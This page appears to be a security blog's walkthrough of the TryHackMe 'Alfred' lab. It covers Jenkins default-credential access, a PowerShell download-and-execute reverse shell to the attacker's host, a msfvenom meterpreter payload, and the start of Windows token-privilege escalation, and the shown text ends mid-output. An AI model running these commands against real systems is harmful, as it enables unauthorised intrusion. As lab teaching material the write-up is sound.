<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="theme" content="Chirpy v2.7.0"><meta name="generator" content="Jekyll v4.2.0" /><meta property="og:title" content="Writeup for TryHackMe room - Alfred" /><meta name="author" content="4n3i5v74" /><meta property="og:locale" content="en_US" /><meta name="description" content="A Security Blog from 4n3i5v74. Used for techincal contents, learning, writeups." /><meta property="og:description" content="A Security Blog from 4n3i5v74. Used for techincal contents, learning, writeups." /><link rel="canonical" href="https://4n3i5v74.github.io/posts/tryhackme-alfred/" /><meta property="og:url" content="https://4n3i5v74.github.io/posts/tryhackme-alfred/" /><meta property="og:site_name" content="4n3i5v74" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2021-03-22T00:00:00+05:30" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Writeup for TryHackMe room - Alfred" /><meta name="twitter:site" content="@nive1103" /><meta name="twitter:creator" content="@4n3i5v74" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"author":{"@type":"Person","name":"4n3i5v74"},"headline":"Writeup for TryHackMe room - Alfred","dateModified":"2021-05-13T23:09:48+05:30","datePublished":"2021-03-22T00:00:00+05:30","description":"A Security Blog from 4n3i5v74. Used for techincal contents, learning, writeups.","url":"https://4n3i5v74.github.io/posts/tryhackme-alfred/","mainEntityOfPage":{"@type":"WebPage","@id":"https://4n3i5v74.github.io/posts/tryhackme-alfred/"},"@type":"BlogPosting","@context":"https://schema.org"}</script><title>Writeup for TryHackMe room - Alfred | 4n3i5v74</title><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon.png"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon-precomposed.png"><link rel="apple-touch-icon" sizes="57x57" href="/assets/img/favicons/apple-icon-57x57.png"><link rel="apple-touch-icon" sizes="60x60" href="/assets/img/favicons/apple-icon-60x60.png"><link rel="apple-touch-icon" sizes="72x72" href="/assets/img/favicons/apple-icon-72x72.png"><link rel="apple-touch-icon" sizes="76x76" href="/assets/img/favicons/apple-icon-76x76.png"><link rel="apple-touch-icon" sizes="114x114" href="/assets/img/favicons/apple-icon-114x114.png"><link rel="apple-touch-icon" sizes="120x120" href="/assets/img/favicons/apple-icon-120x120.png"><link rel="apple-touch-icon" sizes="144x144" href="/assets/img/favicons/apple-icon-144x144.png"><link rel="apple-touch-icon" sizes="152x152" href="/assets/img/favicons/apple-icon-152x152.png"><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-icon-180x180.png"><link rel="icon" type="image/png" sizes="192x192" href="/assets/img/favicons/android-icon-192x192.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="96x96" href="/assets/img/favicons/favicon-96x96.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/manifest.json"><meta name='msapplication-config' content='/assets/img/favicons/browserconfig.xml'><meta name="msapplication-TileColor" content="#ffffff"><meta name="msapplication-TileImage" content="/assets/img/favicons/ms-icon-144x144.png"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="cdn.jsdelivr.net"><link rel="dns-prefetch" href="cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin="anonymous"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css" integrity="sha256-+N4/V/SbAFiW1MPBCXnfnP9QSN3+Keu+NlB+0ev/YKQ=" crossorigin="anonymous"><link rel="preload" href="/assets/css/post.css" as="style"><link rel="stylesheet" href="/assets/css/post.css"><link rel="stylesheet" href="/assets/css/local.css"><link rel="preload" as="style" href="/assets/css/lib/bootstrap-toc.min.css"><link rel="stylesheet" href="/assets/css/lib/bootstrap-toc.min.css" /> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script defer src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script async src="/assets/js/copy-code.js"></script> <script async src="/assets/js/post.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id="></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', ''); }); </script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column"><div id="nav-wrapper"><div id="profile-wrapper" class="d-flex flex-column"><div id="avatar" class="d-flex justify-content-center"> <a href="/" alt="avatar"> <img src="/assets/img/avatar.jpg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="profile-text mt-3"><div class="site-title"> <a href="/">4n3i5v74</a></div><div class="site-subtitle font-italic">A Security Blog.</div></div></div><ul class="nav flex-column"><li class="nav-item d-flex justify-content-center "> <a href="/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item d-flex justify-content-center "> <a href="/tabs/categories/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item d-flex justify-content-center "> <a href="/tabs/tags/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item d-flex justify-content-center "> <a href="/tabs/archives/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a></ul></div><div class="sidebar-bottom d-flex flex-wrap justify-content-around mt-4"> <span id="mode-toggle-wrapper"> <i class="mode-toggle fas fa-adjust"></i> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } var self = this; /* always follow the system prefers */ this.sysDarkPrefers.addListener(function() { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.updateMermaid(); }); } /* constructor() */ setDark() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_KEY); sessionStorage.removeItem(ModeToggle.MODE_KEY); } get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode == ModeToggle.DARK_MODE; } get isLightMode() { return this.mode == ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer) ) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } updateMermaid() { if (typeof mermaid !== "undefined") { let expectedTheme = (this.modeStatus === ModeToggle.DARK_MODE? "dark" : "default"); let config = { theme: expectedTheme }; /* re-render the SVG â€º <https://github.com/mermaid-js/mermaid/issues/311#issuecomment-332557344> */ $(".mermaid").each(function() { let svgCode = $(this).prev().children().html(); $(this).removeAttr("data-processed"); $(this).html(svgCode); }); mermaid.initialize(config); mermaid.init(undefined, ".mermaid"); } } flipMode() { if (this.hasMode) { if (this.isSysDarkPrefer) { if (this.isLightMode) { this.clearMode(); } else { this.setLight(); } } else { if (this.isDarkMode) { this.clearMode(); } else { this.setDark(); } } } else { if (this.isSysDarkPrefer) { this.setLight(); } else { this.setDark(); } } this.updateMermaid(); } /* flipMode() */ } /* ModeToggle */ let toggle = new ModeToggle(); $(".mode-toggle").click(function() { toggle.flipMode(); }); </script> </span> <span class="icon-border"></span> <a href="https://github.com/4n3i5v74" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github-alt"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span>Posts</span> <span>Writeup for TryHackMe room - Alfred</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Writeup for TryHackMe room - Alfred</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Mon, Mar 22, 2021, 12:00 AM +0530" > Mar 22 <i class="unloaded">2021-03-22T00:00:00+05:30</i> </span> by <span class="author"> 4n3i5v74 </span></div><div> <span> Updated <span class="timeago lastmod" data-toggle="tooltip" data-placement="bottom" title="Thu, May 13, 2021, 11:09 PM +0530" > May 13 <i class="unloaded">2021-05-13T23:09:48+05:30</i> </span> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1641 words">9 min</span></div></div><div class="post-content"><div class="flex-container"> <script src="https://tryhackme.com/badge/34685"></script></div><h2 id="alfred"><a href="https://tryhackme.com/room/alfred" target="_blank">Alfred</a></h2><p>This room contains detailed info about jenkins exploitation and windows privilege escalation methods.</p><p>For complete tryhackme path, refer the <a href="https://4n3i5v74.github.io/posts/getting-started-with-cybersecurity-tryhackme/" target="_blank">link</a>.</p><h2 id="tools-used">Tools Used</h2><h3 id="enumeration">Enumeration</h3><ul><li>NMAP</ul><h3 id="exploitation">Exploitation</h3><ul><li>Netcat<li><a href="https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1" target="_blank">Invoke-PowerShellTcp</a><li>Msfvenom<li>Msfconsole</ul><h2 id="task-1---initial-access">Task 1 - Initial Access</h2><h3 id="references">References</h3><ul><li><a href="https://4n3i5v74.github.io/posts/cheatsheet-nmap/" target="_blank">NMAP Reference</a><li><a href="https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1" target="_blank">invoke-powershelltcp reference</a></ul><p>Use <code>nmap</code> to enumerate the target machine using <code>nmap -PN -T4 -sS --top-ports 1000 -A &lt;ip&gt;</code></p><p>The output will be similar to</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="Starting%20Nmap%207.60%20(%20https://nmap.org%20)%20at%202021-04-28%2006:10%20BST%0ANmap%20scan%20report%20for%20%3Chostname%3E%20(%3Cip%3E)%0AHost%20is%20up%20(0.00041s%20latency).%0ANot%20shown:%20997%20filtered%20ports%0APORT%20%20%20%20%20STATE%20SERVICE%20%20%20%20VERSION%0A80/tcp%20%20%20open%20%20http%20%20%20%20%20%20%20Microsoft%20IIS%20httpd%207.5%0A%7C%20http-methods:%0A%7C_%20%20Potentially%20risky%20methods:%20TRACE%0A%7C_http-server-header:%20Microsoft-IIS/7.5%0A%7C_http-title:%20Site%20doesn't%20have%20a%20title%20(text/html).%0A3389/tcp%20open%20%20tcpwrapped%0A%7C%20ssl-cert:%20Subject:%20commonName=alfred%0A%7C%20Not%20valid%20before:%202021-04-27T04:28:50%0A%7C_Not%20valid%20after:%20%202021-10-27T04:28:50%0A8080/tcp%20open%20%20http%20%20%20%20%20%20%20Jetty%209.4.z-SNAPSHOT%0A%7C%20http-robots.txt:%201%20disallowed%20entry%0A%7C_/%0A%7C_http-server-header:%20Jetty(9.4.z-SNAPSHOT)%0A%7C_http-title:%20Site%20doesn't%20have%20a%20title%20(text/html;charset=utf-8).%0AMAC%20Address:%2002:A1:17:7C:CE:0B%20(Unknown)%0AWarning:%20OSScan%20results%20may%20be%20unreliable%20because%20we%20could%20not%20find%20at%20least%201%20open%20and%201%20closed%20port%0AAggressive%20OS%20guesses:%20Microsoft%20Windows%20Server%202008%20(90%25),%20Microsoft%20Windows%20Server%202008%20R2%20(90%25),%20Microsoft%20Windows%20Server%202008%20R2%20or%20Windows%208%20(90%25),%20Microsoft%20Windows%207%20SP1%20(90%25),%20Microsoft%20Windows%208.1%20Update%201%20(90%25),%20Microsoft%20Windows%208.1%20R1%20(90%25),%20Microsoft%20Windows%20Phone%207.5%20or%208.0%20(90%25),%20Microsoft%20Windows%20Server%202008%20or%202008%20Beta%203%20(89%25),%20Microsoft%20Windows%20Server%202008%20R2%20or%20Windows%208.1%20(89%25),%20Microsoft%20Windows%20Server%202008%20R2%20SP1%20(89%25)%0ANo%20exact%20OS%20matches%20for%20host%20(test%20conditions%20non-ideal).%0ANetwork%20Distance:%201%20hop%0AService%20Info:%20OS:%20Windows;%20CPE:%20cpe:/o:microsoft:windows%0A%0ATRACEROUTE%0AHOP%20RTT%20%20%20%20%20ADDRESS%0A1%20%20%200.41%20ms%20%3Chostname%3E%20(%3Cip%3E)%0A%0AOS%20and%20Service%20detection%20performed.%20Please%20report%20any%20incorrect%20results%20at%20https://nmap.org/submit/%20.%0ANmap%20done:%201%20IP%20address%20(1%20host%20up)%20scanned%20in%2043.01%20seconds" type="button"></button></div></div><pre><code>Starting Nmap 7.60 ( https://nmap.org ) at 2021-04-28 06:10 BST
Nmap scan report for &lt;hostname&gt; (&lt;ip&gt;)
Host is up (0.00041s latency).
Not shown: 997 filtered ports
PORT     STATE SERVICE    VERSION
80/tcp   open  http       Microsoft IIS httpd 7.5
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: Site doesn't have a title (text/html).
3389/tcp open  tcpwrapped
| ssl-cert: Subject: commonName=alfred
| Not valid before: 2021-04-27T04:28:50
|_Not valid after:  2021-10-27T04:28:50
8080/tcp open  http       Jetty 9.4.z-SNAPSHOT
| http-robots.txt: 1 disallowed entry
|_/
|_http-server-header: Jetty(9.4.z-SNAPSHOT)
|_http-title: Site doesn't have a title (text/html;charset=utf-8).
MAC Address: 02:A1:17:7C:CE:0B (Unknown)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Microsoft Windows Server 2008 (90%), Microsoft Windows Server 2008 R2 (90%), Microsoft Windows Server 2008 R2 or Windows 8 (90%), Microsoft Windows 7 SP1 (90%), Microsoft Windows 8.1 Update 1 (90%), Microsoft Windows 8.1 R1 (90%), Microsoft Windows Phone 7.5 or 8.0 (90%), Microsoft Windows Server 2008 or 2008 Beta 3 (89%), Microsoft Windows Server 2008 R2 or Windows 8.1 (89%), Microsoft Windows Server 2008 R2 SP1 (89%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 1 hop
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

TRACEROUTE
HOP RTT     ADDRESS
1   0.41 ms &lt;hostname&gt; (&lt;ip&gt;)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 43.01 seconds
</code></pre><p>Use <code>firefox</code> to load the url <code>http://&lt;ip&gt;:8080</code>. Try login with default credentials <code>admin:admin</code> for the <code>jenkins</code> page.</p><p>The default login works, and <code>superuser</code> privilege in <code>jenkins</code> can be exploited to run native os commands.</p><p>Using <code>firefox</code> navigate to <code>project</code> and select <code>configure</code>. Open <code>build</code> which will allow native os commands to be passed on as part of build.</p><p>This exploit can be made use of, to create a <code>reverse shell</code>.</p><p>Create a <code>netcat</code> listener.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="rlwrap%20-cAr%20nc%20-lnvp%20443" type="button"></button></div></div><pre><code>rlwrap -cAr nc -lnvp 443
</code></pre><p>The output will be similar to</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="Listening%20on%20[0.0.0.0]%20(family%200,%20port%20443)" type="button"></button></div></div><pre><code>Listening on [0.0.0.0] (family 0, port 443)
</code></pre><p>Download the <code>Invoke-PowerShellTcp.ps1</code> script using</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="wget%20https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1" type="button"></button></div></div><pre><code>wget https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1
</code></pre><p>Create a local python web server using</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="python%20-m%20http.server%208080" type="button"></button></div></div><pre><code>python -m http.server 8080
</code></pre><p>The output will be similar to</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="Serving%20HTTP%20on%200.0.0.0%20port%208080%20(http://0.0.0.0:8080/)%20..." type="button"></button></div></div><pre><code>Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
</code></pre><p>Use <code>firefox</code> to paste the following code in <code>jenkins</code> build page.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="powershell%20invoke-expression%20(New-Object%20Net.WebClient).DownloadString('http://%3Csource-ip%3E:8080/Invoke-PowerShellTcp.ps1')%20;%20Invoke-PowerShellTcp%20-Reverse%20-IPAddress%20%3Csource-ip%3E%20-Port%20443" type="button"></button></div></div><pre><code>powershell invoke-expression (New-Object Net.WebClient).DownloadString('http://&lt;source-ip&gt;:8080/Invoke-PowerShellTcp.ps1') ; Invoke-PowerShellTcp -Reverse -IPAddress &lt;source-ip&gt; -Port 443
</code></pre><p>Check the <code>console</code> on <code>python web server</code> to see if the file is downloaded. The output will be similar to <code>&lt;target-ip&gt; - - [28/Apr/2021 06:39:25] "GET /Invoke-PowerShellTcp.ps1 HTTP/1.1" 200 -</code>.</p><p>Execution of the script <code>Invoke-PowerShellTcp.ps1</code> will create a <code>reverse shell</code>. The output of <code>netcat</code> console will be similar to</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="Connection%20from%20%3Ctarget-ip%3E%2049257%20received!%0AWindows%20PowerShell%20running%20as%20user%20bruce%20on%20ALFRED%0ACopyright%20(C)%202015%20Microsoft%20Corporation.%20All%20rights%20reserved.%0A%0APS%20C:%5CProgram%20Files%20(x86)%5CJenkins%5Cworkspace%5Cproject%3E%20whoami%0Aalfred%5Cbruce%0A%0APS%20C:%5CProgram%20Files%20(x86)%5CJenkins%5Cworkspace%5Cproject%3E%20type%20%22C:%5Cusers%5Cbruce%5Cdesktop%5Cuser.txt%22%0A%3Cflag%3E%3E" type="button"></button></div></div><pre><code>Connection from &lt;target-ip&gt; 49257 received!
Windows PowerShell running as user bruce on ALFRED
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\Program Files (x86)\Jenkins\workspace\project&gt; whoami
alfred\bruce

PS C:\Program Files (x86)\Jenkins\workspace\project&gt; type "C:\users\bruce\desktop\user.txt"
&lt;flag&gt;&gt;
</code></pre><h2 id="task-2---switching-shells">Task 2 - Switching Shells</h2><p>Use <code>msfvenom</code> to create a payload which spawns <code>meterpreter</code> shell on <code>msfconsole</code>.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="msfvenom%20-p%20windows/meterpreter/reverse_tcp%20-a%20x86%20--encoder%20x86/shikata_ga_nai%20LHOST=%3Csource-ip%3E%20LPORT=443%20-f%20exe%20-o%20shell.exe" type="button"></button></div></div><pre><code>msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=&lt;source-ip&gt; LPORT=443 -f exe -o shell.exe
</code></pre><p>The output will be similar to</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="[-]%20No%20platform%20was%20selected,%20choosing%20Msf::Module::Platform::Windows%20from%20the%20payload%0AFound%201%20compatible%20encoders%0AAttempting%20to%20encode%20payload%20with%201%20iterations%20of%20x86/shikata_ga_nai%0Ax86/shikata_ga_nai%20succeeded%20with%20size%20368%20(iteration=0)%0Ax86/shikata_ga_nai%20chosen%20with%20final%20size%20368%0APayload%20size:%20368%20bytes%0AFinal%20size%20of%20exe%20file:%2073802%20bytes%0ASaved%20as:%20shell.exe" type="button"></button></div></div><pre><code>[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 368 (iteration=0)
x86/shikata_ga_nai chosen with final size 368
Payload size: 368 bytes
Final size of exe file: 73802 bytes
Saved as: shell.exe
</code></pre><p>Use <code>msfconsole -q</code> to create a <code>meterpreter</code> shell listener.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="msf5%20%3E%20use%20exploit/multi/handler%0A[*]%20Using%20configured%20payload%20generic/shell_reverse_tcp%0A%0Amsf5%20exploit(multi/handler)%20%3E%20set%20PAYLOAD%20windows/meterpreter/reverse_tcp%0APAYLOAD%20=%3E%20windows/meterpreter/reverse_tcp%0A%0Amsf5%20exploit(multi/handler)%20%3E%20set%20LHOST%20%3Csource-ip%3E%0ALHOST%20=%3E%20%3Csource-ip%3E%0A%0Amsf5%20exploit(multi/handler)%20%3E%20set%20LPORT%20443%0ALPORT%20=%3E%20443%0A%0Amsf5%20exploit(multi/handler)%20%3E%20run%0A[*]%20Started%20reverse%20TCP%20handler%20on%20%3Csource-ip%3E:443" type="button"></button></div></div><pre><code>msf5 &gt; use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp

msf5 exploit(multi/handler) &gt; set PAYLOAD windows/meterpreter/reverse_tcp
PAYLOAD =&gt; windows/meterpreter/reverse_tcp

msf5 exploit(multi/handler) &gt; set LHOST &lt;source-ip&gt;
LHOST =&gt; &lt;source-ip&gt;

msf5 exploit(multi/handler) &gt; set LPORT 443
LPORT =&gt; 443

msf5 exploit(multi/handler) &gt; run
[*] Started reverse TCP handler on &lt;source-ip&gt;:443
</code></pre><p>Create a local python web server using</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="python%20-m%20http.server%208080" type="button"></button></div></div><pre><code>python -m http.server 8080
</code></pre><p>The output will be similar to</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="Serving%20HTTP%20on%200.0.0.0%20port%208080%20(http://0.0.0.0:8080/)%20..." type="button"></button></div></div><pre><code>Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
</code></pre><p>From the <code>netcat</code> listener reverse shell, download the <code>shell.exe</code> file which was generated using <code>msfvenom</code>.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="powershell%20%22(New-Object%20System.Net.WebClient).Downloadfile('http://%3Csource-ip%3E:8080/shell.exe','shell.exe')%22" type="button"></button></div></div><pre><code>powershell "(New-Object System.Net.WebClient).Downloadfile('http://&lt;source-ip&gt;:8080/shell.exe','shell.exe')"
</code></pre><p>Run the exploit binary using <code>start-process shell.exe</code>. There will be a session opened in <code>meterpreter</code>.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="[*]%20Sending%20stage%20(176195%20bytes)%20to%2010.10.50.154%0A[*]%20Meterpreter%20session%201%20opened%20(10.10.192.53:443%20-%3E%2010.10.50.154:49326)%20at%202021-04-28%2007:37:54%20+0100%0Ameterpreter%20%3E" type="button"></button></div></div><pre><code>[*] Sending stage (176195 bytes) to 10.10.50.154
[*] Meterpreter session 1 opened (10.10.192.53:443 -&gt; 10.10.50.154:49326) at 2021-04-28 07:37:54 +0100
meterpreter &gt;
</code></pre><h2 id="task-3---privilege-escalation">Task 3 - Privilege Escalation</h2><h3 id="references-1">References</h3><ul><li><a href="https://docs.microsoft.com/en-us/windows/win32/secauthz/access-tokens" target="_blank">Windows access token reference</a><li><p><a href="https://www.exploit-db.com/papers/42556" target="_blank">Abusing Token Privileges For LPE</a></p><li>Primary access tokens: those associated with a user account that are generated on log on<li>Impersonation tokens: these allow a particular process(or thread in a process) to gain access to resources using the token of another (user/client) process</ul><p>Different levels of impersonation token</p><ul><li>SecurityAnonymous: current user/client cannot impersonate another user/client<li>SecurityIdentification: current user/client can get the identity and privileges of a client, but cannot impersonate the client<li>SecurityImpersonation: current user/client can impersonate the clientâ€™s security context on the local system<li>SecurityDelegation: current user/client can impersonate the clientâ€™s security context on a remote system</ul><p>Commonly abused privileges</p><ul><li>SeImpersonatePrivilege<li>SeAssignPrimaryPrivilege<li>SeTcbPrivilege<li>SeBackupPrivilege<li>SeRestorePrivilege<li>SeCreateTokenPrivilege<li>SeLoadDriverPrivilege<li>SeTakeOwnershipPrivilege<li>SeDebugPrivilege</ul><p>From the <code>meterpreter</code> session in <code>msfconsole</code>, check the current privileges.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="PS%20C:%5CProgram%20Files%20(x86)%5CJenkins%5Cworkspace%5Cproject%3E%20whoami%20/priv" type="button"></button></div></div><pre><code>PS C:\Program Files (x86)\Jenkins\workspace\project&gt; whoami /priv
</code></pre><p>The output will be similar to</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="PRIVILEGES%20INFORMATION%0A%0APrivilege%20Name%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20Description%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20State%0A===============================%20=========================================%20========%0ASeIncreaseQuotaPrivilege%20%20%20%20%20%20%20%20Adjust%20memory%20quotas%20for%20a%20process%20%20%20%20%20%20%20%20Disabled%0ASeSecurityPrivilege%20%20%20%20%20%20%20%20%20%20%20%20%20Manage%20auditing%20and%20security%20log%20%20%20%20%20%20%20%20%20%20Disabled%0ASeTakeOwnershipPrivilege%20%20%20%20%20%20%20%20Take%20ownership%20of%20files%20or%20other%20objects%20%20Disabled%0ASeLoadDriverPrivilege%20%20%20%20%20%20%20%20%20%20%20Load%20and%20unload%20device%20drivers%20%20%20%20%20%20%20%20%20%20%20%20Disabled%0ASeSystemProfilePrivilege%20%20%20%20%20%20%20%20Profile%20system%20performance%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20Disabled%0ASeSystemtimePrivilege%20%20%20%20%20%20%20%20%20%20%20Change%20the%20system%20time%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20Disabled%0ASeProfileSingleProcessPrivilege%20Profile%20single%20process%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20Disabled%0ASeIncreaseBasePriorityPrivilege%20Increase%20scheduling%20priority%20%20%20%20%20%20%20%20%20%20%20%20%20%20Disabled%0ASeCreatePagefilePrivilege%20%20%20%20%20%20%20Create%20a%20pagefile%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20Disabled%0ASeBackupPrivilege%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20Back%20up%20files%20and%20directories%20%20%20%20%20%20%20%20%20%20%20%20%20Disabled%0ASeRestorePrivilege%20%20%20%20%20%20%20%20%20%20%20%20%20%20Restore%20files%20and%20directories%20%20%20%20%20%20%20%20%20%20%20%20%20Disabled%0ASeShutdownPrivilege%20%20%20%20%20%20%20%20%20%20%20%20%20Shut%20down%20the%20system%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20Disabled%0ASeDebugPrivilege%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20Debug%20programs%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20Enabled%0ASeSystemEnvironmentPrivilege%20%20%20%20Modify%20firmware%20environment%20values%20%20%20%20%20%20%20%20Disabled%0ASeChangeNotifyPrivilege%20%20%20%20%20%20%20%20%20Bypass%20traverse%20checking%20%20%20%20%20%20%20%20%20%20%20%20%20%2